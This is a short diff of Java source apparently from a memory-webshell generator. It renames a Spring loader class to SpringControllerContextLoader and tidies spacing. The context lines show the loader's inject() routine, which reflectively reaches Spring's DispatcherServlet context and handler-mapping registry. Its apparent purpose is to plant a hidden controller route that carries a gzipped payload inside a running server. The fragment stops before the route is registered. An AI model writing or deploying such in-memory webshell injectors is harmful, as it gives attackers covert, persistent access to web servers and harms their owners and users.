@@ -20,13 +20,13 @@ import java.util.zip.GZIPInputStream;
 @MemShell(MemShell.Controller)
 @JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.PATH, JavaClassModifiable.NAME, JavaClassModifiable.CLASSNAME})
-public class SpringContextLoader {
+public class SpringControllerContextLoader {
     private static String gzipObject;
     private static String PATH;
     private static String NAME;
     private static String CLASSNAME;
 
-    public SpringContextLoader() {
+    public SpringControllerContextLoader() {
         try {
             inject();
         } catch (Exception e) {
@@ -38,7 +38,7 @@ public class SpringContextLoader {
         Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("currentRequestAttributes").invoke(null);
         Object context = invokeMethod(requestAttributes.getClass(), requestAttributes, "getAttribute", new Class[]{String.class, Integer.TYPE}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0});
 //         是否存在路由
-        Object mapping = invokeMethod(Class.forName("org.springframework.context.support.AbstractApplicationContext"), context, "getBean", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")} );
+        Object mapping = invokeMethod(Class.forName("org.springframework.context.support.AbstractApplicationContext"), context, "getBean", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")});
 
         Object mappingRegistry = invokeMethod(Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping"), mapping, "getMappingRegistry", new Class[]{}, new Object[]{});
 
